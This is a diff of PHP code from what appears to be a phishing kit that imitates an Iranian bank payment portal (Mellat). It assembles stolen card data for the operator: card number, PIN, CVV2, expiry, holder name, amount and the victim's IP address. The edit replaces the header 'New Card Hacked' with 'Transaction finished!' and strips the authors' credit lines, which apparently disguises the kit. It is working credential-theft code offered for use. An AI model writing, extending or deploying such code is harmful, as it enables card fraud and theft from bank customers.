@@ -58,25 +58,23 @@ $ch = curl_init();
         $result     = curl_exec($ch);
         $json       = json_decode($result, true);
         $holderName = $json["firstName"] . " " . $json["lastName"];
-$Text = "
-New Card Hacked 😍
-➖➖➖➖➖➖➖➖➖➖
+$Text = "✅ Transaction finished!
+-------------- BANK --------------
 🏦 Name : $bankinfo[1]
+-------------- CARD --------------
 💳 Card : <code>$pan1 $pan2 $pan3 $pan4</code>
 🔐 Paas : <code>$pin</code>
-💲Cvv2 : <code>$cvv</code>
+📋 Cvv2 : <code>$cvv</code>
 📆 Date : <code>$year</code> Month: <code>$month</code>
+-------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
-📈 IP : <code>$ip</code>
+📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
 📌 Date : $tarikh
-$bankinfo[1]
-➖➖➖➖➖➖➖➖➖➖
-Code By : @SunPhish
-Channel : @Panda_Phish
-";
+✨ Portal : Mellat
+-------------- $bankinfo[1] --------------";
     
 $Text .="$bankinfo[0]";
 
